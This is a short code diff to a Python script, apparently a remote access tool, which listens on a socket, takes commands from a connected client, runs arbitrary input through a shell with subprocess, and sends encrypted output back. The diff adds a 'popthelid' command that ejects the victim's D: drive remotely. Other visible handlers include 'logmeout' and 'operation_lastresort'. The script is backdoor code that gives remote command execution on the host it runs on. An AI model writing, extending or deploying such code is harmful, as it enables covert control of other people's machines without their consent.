@@ -7,6 +7,12 @@ import os
 import subprocess
 objself = 'crss.py'
 
+def popthelid():
+	os.system("eject D:")
+	outdata = "popped lid"
+	forwardmessage()
+	conn.send(outdata)
+
 def forwardmessage():
 	global outdata
 	while len(outdata) % 16 !=0:
@@ -60,6 +66,8 @@ def clientThread(conn):
 			operation_lastresort()
 		if data == 'logmeout':
 			logmeout()
+		if data == 'popthelid':
+			popthelid()
 		if "cd" in data:
 			outdata = ""
 			try:
@@ -72,7 +80,7 @@ def clientThread(conn):
 				outdata = outdata + '@'
 			outdata = encry.encrypt(outdata)
 			conn.send(outdata)
-			
+
 		else:
 			outdata = ""
 			outdata = subprocess.check_output(data,shell=True)
